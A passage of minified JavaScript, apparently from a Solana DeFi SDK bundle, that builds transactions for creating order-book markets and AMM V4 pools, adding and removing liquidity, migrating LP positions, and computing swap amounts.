                  ? { pubkey: e.authority, isSigner: !1, isWritable: !1 }
                  : []
              )
              .concat(
                e.authority && e.pruneAuthority
                  ? { pubkey: e.pruneAuthority, isSigner: !1, isWritable: !1 }
                  : []
              ),
            o = dt.alloc(n.span);
          return (
            n.encode(
              {
                version: 0,
                instruction: 0,
                baseLotSize: e.baseLotSize,
                quoteLotSize: e.quoteLotSize,
                feeRateBps: e.feeRateBps,
                vaultSignerNonce: e.vaultSignerNonce,
                quoteDustThreshold: e.quoteDustThreshold,
              },
              o
            ),
            new vs({ keys: r, programId: t, data: o })
          );
        })({
          programId: n.programId,
          marketInfo: {
            id: n.id.publicKey,
            requestQueue: n.requestQueue.publicKey,
            eventQueue: n.eventQueue.publicKey,
            bids: n.bids.publicKey,
            asks: n.asks.publicKey,
            baseVault: n.baseVault.publicKey,
            quoteVault: n.quoteVault.publicKey,
            baseMint: n.baseMint,
            quoteMint: n.quoteMint,
            baseLotSize: n.baseLotSize,
            quoteLotSize: n.quoteLotSize,
            feeRateBps: n.feeRateBps,
            vaultSignerNonce: n.vaultSignerNonce,
            quoteDustThreshold: n.quoteDustThreshold,
          },
        })
      ),
      [
        { transaction: d, signer: [], instructionTypes: [hS, hS, pS, pS] },
        {
          transaction: h,
          signer: [],
          instructionTypes: [hS, hS, hS, hS, hS, wS],
        },
      ]
    );
  }
  var JE = class extends cT {
      async create({
        baseInfo: t,
        quoteInfo: e,
        lotSize: n,
        tickSize: r,
        dexProgramId: o,
        requestQueueSpace: i,
        eventQueueSpace: s,
        orderbookQueueSpace: a,
        lowestFeeMarket: u,
        assignSeed: c,
        txVersion: l,
        computeBudgetConfig: d,
        txTipConfig: f,
        feePayer: h,
      }) {
        let p = this.scope.ownerPubKey,
          m = c
            ? `${t.mint.toBase58().slice(0, 10)}-${e.mint
                .toBase58()
                .slice(0, 10)}-${c}`
            : void 0,
          g = $T({
            fromPublicKey: p,
            programId: o,
            assignSeed: m && `${m}-market`,
          }),
          y = $T({
            fromPublicKey: p,
            programId: o,
            assignSeed: m && `${m}-request`,
          }),
          w = $T({
            fromPublicKey: p,
            programId: o,
            assignSeed: m && `${m}-event`,
          }),
          b = $T({
            fromPublicKey: p,
            programId: o,
            assignSeed: m && `${m}-bids`,
          }),
          v = $T({
            fromPublicKey: p,
            programId: o,
            assignSeed: m && `${m}-asks`,
          }),
          A = $T({
            fromPublicKey: p,
            programId: Bc,
            assignSeed: m && `${m}-baseVault`,
          }),
          k = $T({
            fromPublicKey: p,
            programId: Bc,
            assignSeed: m && `${m}-quoteVault`,
          }),
          I = new Yn(100);
        let { vaultOwner: S, vaultSignerNonce: _ } = (function () {
            let t = new Yn(0);
            for (;;)
              try {
                return {
                  vaultOwner: Ji.createProgramAddressSync(
                    [g.publicKey.toBuffer(), t.toArrayLike(dt, "le", 8)],
                    o
                  ),
                  vaultSignerNonce: t,
                };
              } catch {
                if ((t.iaddn(1), t.gt(new Yn(25555))))
                  throw Error("find vault owner error");
              }
          })(),
          T = new Yn(Math.round(10 ** t.decimals * n)),
          B = new Yn(Math.round(n * 10 ** e.decimals * r));
        if (T.eq(nS)) throw Error("lot size is too small");
        if (B.eq(nS)) throw Error("tick size or lot size is too small");
        let C = await XE({
            connection: this.scope.connection,
            wallet: this.scope.ownerPubKey,
            marketInfo: {
              programId: o,
              id: g,
              baseMint: t.mint,
              quoteMint: e.mint,
              baseVault: A,
              quoteVault: k,
              vaultOwner: S,
              requestQueue: y,
              eventQueue: w,
              bids: b,
              asks: v,
              feeRateBps: 0,
              quoteDustThreshold: I,
              vaultSignerNonce: _,
              baseLotSize: T,
              quoteLotSize: B,
              requestQueueSpace: i,
              eventQueueSpace: s,
              orderbookQueueSpace: a,
              lowestFeeMarket: u,
            },
          }),
          E = this.createTxBuilder(h);
        E.addInstruction({
          instructions: C[0].transaction.instructions,
          signers: C[0].signer,
        });
        for await (let x of C.slice(1, C.length))
          E.addInstruction({
            instructions: x.transaction.instructions,
            signers: x.signer,
            instructionTypes: x.instructionTypes,
          });
        return 0 === l
          ? E.sizeCheckBuildV0({
              computeBudgetConfig: d,
              address: {
                marketId: g.publicKey,
                requestQueue: y.publicKey,
                eventQueue: w.publicKey,
                bids: b.publicKey,
                asks: v.publicKey,
                baseVault: A.publicKey,
                quoteVault: k.publicKey,
                baseMint: new Ji(t.mint),
                quoteMint: new Ji(e.mint),
              },
            })
          : E.sizeCheckBuild({
              computeBudgetConfig: d,
              address: {
                marketId: g.publicKey,
                requestQueue: y.publicKey,
                eventQueue: w.publicKey,
                bids: b.publicKey,
                asks: v.publicKey,
                baseVault: A.publicKey,
                quoteVault: k.publicKey,
                baseMint: new Ji(t.mint),
                quoteMint: new Ji(e.mint),
              },
            });
      }
    },
    YE = class extends cT {
      constructor(t) {
        super(t),
          (this.stableLayout = new LE({ connection: this.scope.connection }));
      }
      async initLayout() {
        await this.stableLayout.initStableModelLayout();
      }
      async load() {
        this.checkDisabled();
      }
      computePairAmount({ poolInfo: t, amount: e, slippage: n, baseIn: r }) {
        let o = new Yn(
            new bI(e).mul(10 ** t[r ? "mintA" : "mintB"].decimals).toFixed(0)
          ),
          i = lE(t[r ? "mintB" : "mintA"]),
          [s, a] = [
            new Yn(
              new bI(t.mintAmountA).mul(10 ** t.mintA.decimals).toString()
            ),
            new Yn(
              new bI(t.mintAmountB).mul(10 ** t.mintB.decimals).toString()
            ),
          ],
          u = new Yn(
            new bI(t.lpAmount)
              .mul(10 ** t.lpMint.decimals)
              .toFixed(0, bI.ROUND_DOWN)
          );
        this.logDebug(
          "baseReserve:",
          s.toString(),
          "quoteReserve:",
          a.toString()
        ),
          this.logDebug(
            "tokenIn:",
            r ? t.mintA.symbol : t.mintB.symbol,
            "amountIn:",
            o.toString(),
            "anotherToken:",
            r ? t.mintB.symbol : t.mintA.symbol,
            "slippage:",
            `${n.toSignificant()}%`,
            "baseReserve",
            s.toString(),
            "quoteReserve",
            a.toString()
          );
        let c = r ? "base" : "quote";
        this.logDebug("input side:", c);
        let l = nS;
        o.isZero() || (l = "base" === c ? sS(o.mul(a), s) : sS(o.mul(s), a)),
          this.logDebug("amountRaw:", l.toString(), "lpAmount:", u.toString());
        let d = sS(o.mul(u), "base" === c ? s : a);
        this.logDebug("liquidity:", d.toString());
        let f = new QI(new Yn(1)).add(n),
          h = new QI(new Yn(1)).sub(n),
          p = f.mul(l).quotient,
          m = h.mul(l).quotient,
          g = new OI(i, l),
          y = new OI(i, p),
          w = new OI(i, m);
        return (
          this.logDebug(
            "anotherAmount:",
            g.toFixed(),
            "maxAnotherAmount:",
            y.toFixed()
          ),
          {
            anotherAmount: g,
            maxAnotherAmount: y,
            minAnotherAmount: w,
            liquidity: d,
          }
        );
      }
      async getAmmPoolKeys(t) {
        return (await this.scope.api.fetchPoolKeysById({ idList: [t] }))[0];
      }
      async addLiquidity(t) {
        let {
          poolInfo: e,
          poolKeys: n,
          amountInA: r,
          amountInB: o,
          otherAmountMin: i,
          fixedSide: s,
          config: a,
          txVersion: u,
          computeBudgetConfig: c,
          txTipConfig: l,
          feePayer: d,
        } = t;
        !1 === this.scope.availability.addStandardPosition &&
          this.logAndCreateError(
            "add liquidity feature disabled in your region"
          ),
          this.logDebug("amountInA:", r, "amountInB:", o),
          (r.isZero() || o.isZero()) &&
            this.logAndCreateError(
              "amounts must greater than zero",
              "amountInA & amountInB",
              { amountInA: r.toFixed(), amountInB: o.toFixed() }
            );
        let { account: f } = this.scope,
          { bypassAssociatedCheck: h, checkCreateATAOwner: p } = SA(
            { bypassAssociatedCheck: !1, checkCreateATAOwner: !1 },
            a
          ),
          [m, g] = [r.token, o.token],
          y = await f.getCreatedTokenAccount({
            mint: m.mint,
            associatedOnly: !1,
          }),
          w = await f.getCreatedTokenAccount({
            mint: g.mint,
            associatedOnly: !1,
          });
        !y &&
          !w &&
          this.logAndCreateError(
            "cannot found target token accounts",
            "tokenAccounts",
            f.tokenAccounts
          );
        let b = await f.getCreatedTokenAccount({
            mint: new Ji(e.lpMint.address),
          }),
          v = [m, g],
          A = [y, w],
          k = [r.raw, o.raw],
          I = r.token.mint.toBase58() === e.mintA.address ? "base" : "quote",
          S = "base";
        ["quote", "base"].includes(I) ||
          this.logAndCreateError("invalid fixedSide", "fixedSide", s),
          "quote" === I
            ? (v.reverse(),
              A.reverse(),
              k.reverse(),
              (S = "a" === s ? "quote" : "base"))
            : "base" === I && (S = "a" === s ? "base" : "quote");
        let [_, T] = v,
          [B, C] = A,
          [E, x] = k,
          P = null != n ? n : await this.getAmmPoolKeys(e.id),
          O = this.createTxBuilder(d),
          R = await f.handleTokenAccount({
            side: "in",
            amount: E,
            mint: _.mint,
            tokenAccount: B,
            bypassAssociatedCheck: h,
            checkCreateATAOwner: p,
          }),
          { tokenAccount: M } = R,
          L = TA(R, ["tokenAccount"]);
        O.addInstruction(L);
        let N = await f.handleTokenAccount({
            side: "in",
            amount: x,
            mint: T.mint,
            tokenAccount: C,
            bypassAssociatedCheck: h,
            checkCreateATAOwner: p,
          }),
          { tokenAccount: D } = N,
          U = TA(N, ["tokenAccount"]);
        O.addInstruction(U);
        let q = await f.handleTokenAccount({
            side: "out",
            amount: 0,
            mint: new Ji(e.lpMint.address),
            tokenAccount: b,
            bypassAssociatedCheck: h,
            checkCreateATAOwner: p,
          }),
          { tokenAccount: z } = q,
          K = TA(q, ["tokenAccount"]);
        return (
          O.addInstruction(K),
          O.addInstruction({
            instructions: [
              DE({
                poolInfo: e,
                poolKeys: P,
                userKeys: {
                  baseTokenAccount: M,
                  quoteTokenAccount: D,
                  lpTokenAccount: z,
                  owner: this.scope.ownerPubKey,
                },
                baseAmountIn: E,
                quoteAmountIn: x,
                otherAmountMin: i.raw,
                fixedSide: S,
              }),
            ],
            instructionTypes: [e.pooltype.includes("StablePool") ? DS : RS],
            lookupTableAddress: P.lookupTableAccount
              ? [P.lookupTableAccount]
              : [],
          }),
          O.addCustomComputeBudget(c),
          O.addTipInstruction(l),
          0 === u ? await O.buildV0() : O.build()
        );
      }
      async removeLiquidity(t) {
        !1 === this.scope.availability.removeStandardPosition &&
          this.logAndCreateError(
            "remove liquidity feature disabled in your region"
          );
        let {
            poolInfo: e,
            poolKeys: n,
            lpAmount: r,
            baseAmountMin: o,
            quoteAmountMin: i,
            config: s,
            txVersion: a,
            computeBudgetConfig: u,
            txTipConfig: c,
            feePayer: l,
          } = t,
          d = null != n ? n : await this.getAmmPoolKeys(e.id),
          [f, h, p] = [
            new Ji(e.mintA.address),
            new Ji(e.mintB.address),
            new Ji(e.lpMint.address),
          ];
        this.logDebug("lpAmount:", r),
          this.logDebug("baseAmountMin:", o),
          this.logDebug("quoteAmountMin:", i),
          r.isZero() &&
            this.logAndCreateError(
              "amount must greater than zero",
              "lpAmount",
              r.toString()
            );
        let { account: m } = this.scope,
          g = await m.getCreatedTokenAccount({ mint: p, associatedOnly: !1 });
        g ||
          this.logAndCreateError(
            "cannot found lpTokenAccount",
            "tokenAccounts",
            m.tokenAccounts
          );
        let y = await m.getCreatedTokenAccount({ mint: f }),
          w = await m.getCreatedTokenAccount({ mint: h }),
          b = this.createTxBuilder(l),
          { bypassAssociatedCheck: v, checkCreateATAOwner: A } = SA(
            { bypassAssociatedCheck: !1, checkCreateATAOwner: !1 },
            s
          ),
          k = await m.handleTokenAccount({
            side: "out",
            amount: 0,
            mint: f,
            tokenAccount: y,
            bypassAssociatedCheck: v,
            checkCreateATAOwner: A,
          }),
          { tokenAccount: I } = k,
          S = TA(k, ["tokenAccount"]);
        b.addInstruction(S);
        let _ = await m.handleTokenAccount({
            side: "out",
            amount: 0,
            mint: h,
            tokenAccount: w,
            bypassAssociatedCheck: v,
            checkCreateATAOwner: A,
          }),
          { tokenAccount: T } = _,
          B = TA(_, ["tokenAccount"]);
        return (
          b.addInstruction(B),
          b.addInstruction({
            instructions: [
              UE({
                poolInfo: e,
                poolKeys: d,
                userKeys: {
                  lpTokenAccount: g,
                  baseTokenAccount: I,
                  quoteTokenAccount: T,
                  owner: this.scope.ownerPubKey,
                },
                lpAmount: r,
                baseAmountMin: o,
                quoteAmountMin: i,
              }),
            ],
            lookupTableAddress: d.lookupTableAccount
              ? [d.lookupTableAccount]
              : [],
            instructionTypes: [e.pooltype.includes("StablePool") ? US : MS],
          }),
          b.addCustomComputeBudget(u),
          b.addTipInstruction(c),
          0 === a ? await b.buildV0() : b.build()
        );
      }
      async removeAllLpAndCreateClmmPosition({
        poolInfo: t,
        clmmPoolInfo: e,
        removeLpAmount: n,
        createPositionInfo: r,
        farmInfo: o,
        userFarmLpAmount: i,
        base: s,
        computeBudgetConfig: a,
        payer: u,
        userAuxiliaryLedgers: c,
        tokenProgram: l = Bc,
        checkCreateATAOwner: d = !0,
        getEphemeralSigners: f,
        txVersion: h,
        feePayer: p,
      }) {
        if (
          ((!1 === this.scope.availability.removeStandardPosition ||
            !1 === this.scope.availability.createConcentratedPosition) &&
            this.logAndCreateError(
              "remove liquidity or create position feature disabled in your region"
            ),
          (t.mintA.address !== e.mintA.address &&
            t.mintA.address !== e.mintB.address) ||
            (t.mintB.address !== e.mintA.address &&
              t.mintB.address !== e.mintB.address))
        )
          throw Error("mint check error");
        let m = this.createTxBuilder(p),
          g = {};
        for (let P of this.scope.account.tokenAccountRawInfos)
          (void 0 === g[P.accountInfo.mint.toString()] ||
            y_(this.scope.ownerPubKey, P.accountInfo.mint, Bc).publicKey.equals(
              P.pubkey
            )) &&
            (g[P.accountInfo.mint.toString()] = P.pubkey);
        let y = g[t.lpMint.address];
        if (void 0 === y)
          throw Error("find lp account error in trade accounts");
        let w = n.add(null != i ? i : new Yn(0)),
          b = t.mintA.address === XI.WSOL.mint.toString(),
          v = t.mintB.address === XI.WSOL.mint.toString(),
          { account: A, instructionParams: k } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: Bc,
              mint: new Ji(t.mintA.address),
              owner: this.scope.ownerPubKey,
              createInfo: b ? { payer: this.scope.ownerPubKey } : void 0,
              skipCloseAccount: !b,
              notUseTokenAccount: b,
              associatedOnly: !0,
              checkCreateATAOwner: d,
            });
        if ((m.addInstruction(k || {}), void 0 === A))
          throw new Error("base token account not found");
        let { account: I, instructionParams: S } =
          await this.scope.account.getOrCreateTokenAccount({
            tokenProgram: Bc,
            mint: new Ji(t.mintB.address),
            owner: this.scope.ownerPubKey,
            createInfo: v
              ? { payer: this.scope.ownerPubKey, amount: 0 }
              : void 0,
            skipCloseAccount: !v,
            notUseTokenAccount: v,
            associatedOnly: !0,
            checkCreateATAOwner: d,
          });
        if ((m.addInstruction(S || {}), void 0 === I))
          throw new Error("quote token account not found");
        if (
          ((g[t.mintA.address] = A),
          (g[t.mintB.address] = I),
          void 0 !== o && (null == i || !i.isZero()))
        ) {
          let t,
            e = xB[o.programId],
            n = RB({
              programId: new Ji(o.programId),
              poolId: new Ji(o.id),
              owner: this.scope.ownerPubKey,
              version: e,
            }),
            r = await this.scope.connection.getAccountInfo(n);
          if ((r && (t = NB(e).decode(r.data)), 6 !== e && !t)) {
            let { instruction: t, instructionType: r } = UB({
              id: new Ji(o.id),
              programId: new Ji(o.programId),
              version: e,
              ledger: n,
              owner: this.scope.ownerPubKey,
            });
            m.addInstruction({ instructions: [t], instructionTypes: [r] });
          }
          let s = [];
          for (let i of o.rewardInfos) {
            let t = i.mint.address === XI.WSOL.mint.toString();
            if (g[i.mint.address]) s.push(g[i.mint.address]);
            else {
              let { account: e, instructionParams: n } =
                await this.scope.account.getOrCreateTokenAccount({
                  mint: new Ji(i.mint.address),
                  tokenProgram: l,
                  owner: this.scope.ownerPubKey,
                  skipCloseAccount: !t,
                  createInfo: { payer: u || this.scope.ownerPubKey },
                  associatedOnly: !0,
                  checkCreateATAOwner: d,
                });
              e ||
                this.logAndCreateError(
                  "farm reward account not found:",
                  i.mint.address
                ),
                n && m.addInstruction(n),
                s.push(e);
            }
          }
          let a = (await this.scope.api.fetchFarmKeysById({ ids: o.id }))[0],
            f = {
              userAuxiliaryLedgers: c,
              amount: i,
              owner: this.scope.ownerPubKey,
              farmInfo: o,
              farmKeys: a,
              lpAccount: y,
              rewardAccounts: s,
            },
            h = xB[o.programId],
            p = 6 === h ? KB(f) : 5 === h ? WB(f) : FB(f),
            w = { 3: WS, 5: VS, 6: ZS };
          m.addInstruction({ instructions: [p], instructionTypes: [w[h]] });
        }
        let _ = await this.getAmmPoolKeys(t.id),
          T = UE({
            poolInfo: t,
            poolKeys: _,
            userKeys: {
              lpTokenAccount: y,
              baseTokenAccount: A,
              quoteTokenAccount: I,
              owner: this.scope.ownerPubKey,
            },
            lpAmount: w,
            baseAmountMin: 0,
            quoteAmountMin: 0,
          });
        m.addInstruction({
          instructions: [T],
          instructionTypes: [t.pooltype.includes("StablePool") ? US : MS],
          lookupTableAddress: _.lookupTableAccount
            ? [_.lookupTableAccount]
            : [],
        });
        let [B, C] = t.mintA.address === e.mintA.address ? [A, I] : [I, A],
          E = await this.scope.clmm.getClmmPoolKeys(e.id),
          x = await cE.openPositionFromBaseInstructions(
            _A(
              SA(
                {
                  poolInfo: e,
                  poolKeys: E,
                  ownerInfo: {
                    feePayer: this.scope.ownerPubKey,
                    wallet: this.scope.ownerPubKey,
                    tokenAccountA: B,
                    tokenAccountB: C,
                  },
                  withMetadata: "create",
                },
                r
              ),
              { base: s, getEphemeralSigners: f }
            )
          );
        return (
          m.addInstruction({
            instructions: [...x.instructions],
            signers: x.signers,
            instructionTypes: [...x.instructionTypes],
            lookupTableAddress: E.lookupTableAccount
              ? [E.lookupTableAccount]
              : [],
          }),
          0 === h
            ? m.sizeCheckBuildV0({ computeBudgetConfig: a })
            : m.sizeCheckBuild({ computeBudgetConfig: a })
        );
      }
      async createPoolV4({
        programId: t,
        marketInfo: e,
        baseMintInfo: n,
        quoteMintInfo: r,
        baseAmount: o,
        quoteAmount: i,
        startTime: s,
        ownerInfo: a,
        associatedOnly: u = !1,
        checkCreateATAOwner: c = !1,
        tokenProgram: l,
        txVersion: d,
        feeDestinationId: f,
        computeBudgetConfig: h,
        txTipConfig: p,
        feePayer: m,
      }) {
        var g;
        let y =
            a.feePayer ||
            (null == (g = this.scope.owner) ? void 0 : g.publicKey),
          w = a.useSOLBalance && n.mint.equals(xc),
          b = a.useSOLBalance && r.mint.equals(xc),
          v = this.createTxBuilder(m),
          { account: A, instructionParams: k } =
            await this.scope.account.getOrCreateTokenAccount({
              mint: n.mint,
              owner: this.scope.ownerPubKey,
              createInfo: w ? { payer: y, amount: o } : void 0,
              notUseTokenAccount: w,
              skipCloseAccount: !w,
              associatedOnly: !w && u,
              checkCreateATAOwner: c,
            });
        v.addInstruction(k || {});
        let { account: I, instructionParams: S } =
          await this.scope.account.getOrCreateTokenAccount({
            mint: r.mint,
            owner: this.scope.ownerPubKey,
            createInfo: b ? { payer: y, amount: i } : void 0,
            notUseTokenAccount: b,
            skipCloseAccount: !b,
            associatedOnly: !b && u,
            checkCreateATAOwner: c,
          });
        if ((v.addInstruction(S || {}), void 0 === A || void 0 === I))
          throw Error("you don't has some token account");
        let _ = GE({
            version: 4,
            marketVersion: 3,
            marketId: e.marketId,
            baseMint: n.mint,
            quoteMint: r.mint,
            baseDecimals: n.decimals,
            quoteDecimals: r.decimals,
            programId: t,
            marketProgramId: e.programId,
          }),
          T = {
            programId: t,
            ammId: _.id,
            ammAuthority: _.authority,
            ammOpenOrders: _.openOrders,
            lpMint: _.lpMint,
            coinMint: _.baseMint,
            pcMint: _.quoteMint,
            coinVault: _.baseVault,
            pcVault: _.quoteVault,
            withdrawQueue: _.withdrawQueue,
            ammTargetOrders: _.targetOrders,
            poolTempLp: _.lpVault,
            marketProgramId: _.marketProgramId,
            marketId: _.marketId,
            ammConfigId: _.configId,
            feeDestinationId: f,
          },
          { instruction: B, instructionType: C } = qE(
            _A(SA({}, T), {
              userWallet: this.scope.ownerPubKey,
              userCoinVault: A,
              userPcVault: I,
              userLpVault: y_(this.scope.ownerPubKey, _.lpMint, l).publicKey,
              nonce: _.nonce,
              openTime: s,
              coinAmount: o,
              pcAmount: i,
            })
          );
        return (
          v.addInstruction({ instructions: [B], instructionTypes: [C] }),
          v.addCustomComputeBudget(h),
          v.addTipInstruction(p),
          v.versionBuild({ txVersion: d, extInfo: { address: T } })
        );
      }
      async createMarketAndPoolV4({
        programId: t = S_,
        marketProgram: e = k_,
        feeDestinationId: n = E_,
        tokenProgram: r,
        baseMintInfo: o,
        quoteMintInfo: i,
        baseAmount: s,
        quoteAmount: a,
        startTime: u,
        ownerInfo: c,
        lowestFeeMarket: l,
        assignSeed: d,
        associatedOnly: f = !1,
        checkCreateATAOwner: h = !1,
        lotSize: p = 1,
        tickSize: m = 0.01,
        txVersion: g,
        computeBudgetConfig: y,
        txTipConfig: w,
        feePayer: b,
      }) {
        var v, A, k;
        let I = this.scope.ownerPubKey,
          S =
            c.feePayer ||
            (null == (v = this.scope.owner) ? void 0 : v.publicKey),
          _ = c.useSOLBalance && o.mint.equals(xc),
          T = c.useSOLBalance && i.mint.equals(xc),
          B = d
            ? `${o.mint.toBase58().slice(0, 7)}-${i.mint
                .toBase58()
                .slice(0, 7)}-${d}`
            : void 0,
          C = $T({
            fromPublicKey: I,
            programId: e,
            assignSeed: B && `${B}-market`,
          }),
          E = $T({
            fromPublicKey: I,
            programId: e,
            assignSeed: B && `${B}-request`,
          }),
          x = $T({
            fromPublicKey: I,
            programId: e,
            assignSeed: B && `${B}-event`,
          }),
          P = $T({
            fromPublicKey: I,
            programId: e,
            assignSeed: B && `${B}-bids`,
          }),
          O = $T({
            fromPublicKey: I,
            programId: e,
            assignSeed: B && `${B}-asks`,
          }),
          R = $T({
            fromPublicKey: I,
            programId: Bc,
            assignSeed: B && `${B}-baseVault`,
          }),
          M = $T({
            fromPublicKey: I,
            programId: Bc,
            assignSeed: B && `${B}-quoteVault`,
          }),
          L = new Yn(100);
        let { vaultOwner: N, vaultSignerNonce: D } = (function () {
            let t = new Yn(0);
            for (;;)
              try {
                return {
                  vaultOwner: Ji.createProgramAddressSync(
                    [C.publicKey.toBuffer(), t.toArrayLike(dt, "le", 8)],
                    e
                  ),
                  vaultSignerNonce: t,
                };
              } catch {
                if ((t.iaddn(1), t.gt(new Yn(25555))))
                  throw Error("find vault owner error");
              }
          })(),
          U = new Yn(Math.round(10 ** o.decimals * p)),
          q = new Yn(Math.round(p * 10 ** i.decimals * m));
        if (U.eq(nS)) throw Error("lot size is too small");
        if (q.eq(nS)) throw Error("tick size or lot size is too small");
        let z = await XE({
            connection: this.scope.connection,
            wallet: this.scope.ownerPubKey,
            marketInfo: {
              programId: e,
              vaultOwner: N,
              baseMint: o.mint,
              quoteMint: i.mint,
              id: C,
              baseVault: R,
              quoteVault: M,
              requestQueue: E,
              eventQueue: x,
              bids: P,
              asks: O,
              feeRateBps: 0,
              quoteDustThreshold: L,
              vaultSignerNonce: D,
              baseLotSize: U,
              quoteLotSize: q,
              lowestFeeMarket: l,
            },
          }),
          K = this.createTxBuilder(b);
        K.addInstruction({
          instructions: z[0].transaction.instructions,
          signers: z[0].signer,
        });
        for await (let Y of z.slice(1, z.length))
          K.addInstruction({
            instructions: Y.transaction.instructions,
            signers: Y.signer,
            instructionTypes: Y.instructionTypes,
          });
        let { account: W, instructionParams: F } =
          await this.scope.account.getOrCreateTokenAccount({
            mint: o.mint,
            owner: this.scope.ownerPubKey,
            createInfo: _ ? { payer: S, amount: s } : void 0,
            notUseTokenAccount: _,
            skipCloseAccount: !_,
            associatedOnly: !_ && f,
            checkCreateATAOwner: h,
            assignSeed: _ && B ? `${B}-wsol` : void 0,
          });
        K.addInstruction(F || {});
        let { account: j, instructionParams: G } =
          await this.scope.account.getOrCreateTokenAccount({
            mint: i.mint,
            owner: this.scope.ownerPubKey,
            createInfo: T ? { payer: S, amount: a } : void 0,
            notUseTokenAccount: T,
            skipCloseAccount: !T,
            associatedOnly: !T && f,
            checkCreateATAOwner: h,
            assignSeed: T && B ? `${B}-wsol` : void 0,
          });
        if ((K.addInstruction(G || {}), void 0 === W))
          throw Error("you don't has base token account");
        if (void 0 === j) throw Error("you don't has quote token account");
        let V = GE({
            version: 4,
            marketVersion: 3,
            marketId: C.publicKey,
            baseMint: o.mint,
            quoteMint: i.mint,
            baseDecimals: o.decimals,
            quoteDecimals: i.decimals,
            programId: t,
            marketProgramId: e,
          }),
          H = {
            programId: t,
            ammId: V.id,
            ammAuthority: V.authority,
            ammOpenOrders: V.openOrders,
            lpMint: V.lpMint,
            coinMint: V.baseMint,
            pcMint: V.quoteMint,
            coinVault: V.baseVault,
            pcVault: V.quoteVault,
            withdrawQueue: V.withdrawQueue,
            ammTargetOrders: V.targetOrders,
            poolTempLp: V.lpVault,
            marketProgramId: V.marketProgramId,
            marketId: V.marketId,
            ammConfigId: V.configId,
            feeDestinationId: n,
          },
          { instruction: Z, instructionType: X } = qE(
            _A(SA({}, H), {
              userWallet: this.scope.ownerPubKey,
              userCoinVault: W,
              userPcVault: j,
              userLpVault: y_(this.scope.ownerPubKey, V.lpMint, r).publicKey,
              nonce: V.nonce,
              openTime: u,
              coinAmount: s,
              pcAmount: a,
            })
          );
        K.addInstruction({ instructions: [Z], instructionTypes: [X] });
        let J =
          _ || T
            ? [
                (null == (A = null == F ? void 0 : F.instructions)
                  ? void 0
                  : A[0]) ||
                  (null == (k = null == G ? void 0 : G.instructions)
                    ? void 0
                    : k[0]),
              ].filter((t) => !!t)
            : void 0;
        return 0 === g
          ? K.sizeCheckBuildV0({
              computeBudgetConfig: y,
              splitIns: J,
              address: SA(
                {
                  requestQueue: E.publicKey,
                  eventQueue: x.publicKey,
                  bids: P.publicKey,
                  asks: O.publicKey,
                  baseVault: R.publicKey,
                  quoteVault: M.publicKey,
                  baseMint: new Ji(o.mint),
                  quoteMint: new Ji(i.mint),
                },
                H
              ),
            })
          : K.sizeCheckBuild({
              computeBudgetConfig: y,
              splitIns: J,
              address: SA(
                {
                  requestQueue: E.publicKey,
                  eventQueue: x.publicKey,
                  bids: P.publicKey,
                  asks: O.publicKey,
                  baseVault: R.publicKey,
                  quoteVault: M.publicKey,
                  baseMint: new Ji(o.mint),
                  quoteMint: new Ji(i.mint),
                },
                H
              ),
            });
      }
      async getCreatePoolFee({ programId: t }) {
        let e = WE({ programId: t }),
          n = await this.scope.connection.getAccountInfo(e, {
            dataSlice: { offset: 536, length: 8 },
          });
        if (null === n) throw Error("get config account error");
        return AE.decode(n.data).fee;
      }
      computeAmountOut({
        poolInfo: t,
        amountIn: e,
        mintIn: n,
        mintOut: r,
        slippage: o,
      }) {
        let [i, s] = [n.toString(), r.toString()];
        if (i !== t.mintA.address && i !== t.mintB.address)
          throw new Error("toke not match");
        if (s !== t.mintA.address && s !== t.mintB.address)
          throw new Error("toke not match");
        let { baseReserve: a, quoteReserve: u } = t,
          c = [a, u],
          l = [t.mintA.decimals, t.mintB.decimals],
          d = i == t.mintA.address ? "base" : "quote";
        "quote" === d && (c.reverse(), l.reverse());
        let f,
          [h, p] = c,
          [m, g] = l,
          y = 4 === t.version;
        if (y)
          f = new bI(p.toString())
            .div(10 ** g)
            .div(new bI(h.toString()).div(10 ** m));
        else {
          let t = ME(
            this.stableLayout.stableModelData,
            a.toNumber(),
            u.toNumber()
          );
          f =
            "quote" === d ? new bI(1e6).div(1e6 * t) : new bI(1e6 * t).div(1e6);
        }
        let w = e,
          b = new Yn(0),
          v = new Yn(0);
        if (!w.isZero())
          if (y) {
            v = F_(w.mul(pE), mE);
            let t = w.sub(v),
              e = h.add(t);
            b = p.mul(t).div(e);
          } else {
            v = w.mul(new Yn(2)).div(new Yn(1e4));
            let t = w.sub(v);
            b = new Yn(
              "quote" === d
                ? (function (t, e, n, r) {
                    let o = BE(t, e, n),
                      i = CE(t, e, o),
                      s = CE(t, n, o),
                      a = CE(t, r, o),
                      [u, c, l, d] = OE(t, i, a, !0);
                    return d
                      ? l
                        ? (r * t.multiplier) / u
                        : EE(t, s - c, o)
                      : 0;
                  })(
                    this.stableLayout.stableModelData,
                    u.toNumber(),
                    a.toNumber(),
                    t.toNumber()
                  )
                : RE(
                    this.stableLayout.stableModelData,
                    u.toNumber(),
                    a.toNumber(),
                    t.toNumber()
                  )
            );
          }
        let A = new Yn(new bI(b.toString()).mul(1 - o).toFixed(0)),
          k = b,
          I = A,
          S = new bI(b.toString()).div(new bI(w.sub(v).toString()).toFixed(0));
        !w.isZero() &&
          !b.isZero() &&
          (S = new bI(b.toString())
            .div(10 ** g)
            .div(new bI(w.sub(v).toString()).div(10 ** m)));
        let _ = f.sub(S).div(f).mul(100);
        return {
          amountOut: k,
          minAmountOut: I,
          currentPrice: f,
          executionPrice: S,
          priceImpact: _,
          fee: v,
        };
      }
      computeAmountIn({
        poolInfo: t,
        amountOut: e,
        mintIn: n,
        mintOut: r,
        slippage: o,
      }) {
        let { baseReserve: i, quoteReserve: s } = t;
        n.toString() !== t.mintA.address &&
          n.toString() !== t.mintB.address &&
          this.logAndCreateError("mintIn does not match pool"),
          r.toString() !== t.mintA.address &&
            r.toString() !== t.mintB.address &&
            this.logAndCreateError("mintOut does not match pool"),
          this.logDebug("baseReserve:", i.toString()),
          this.logDebug("quoteReserve:", s.toString());
        let a = n.toString() === t.mintA.address,
          [u, c] = a ? [t.mintA, t.mintB] : [t.mintB, t.mintA];
        this.logDebug("currencyOut:", c.symbol || c.address),
          this.logDebug(
            "amountOut:",
            new bI(e.toString())
              .div(10 ** c.decimals)
              .toDecimalPlaces(c.decimals)
              .toString(),
            u.symbol || u.address
          ),
          this.logDebug("slippage:", 100 * o + "%");
        let l = [i, s],
          d = a ? "quote" : "base";
        "base" === d && l.reverse(), this.logDebug("output side:", d);
        let [f, h] = l,
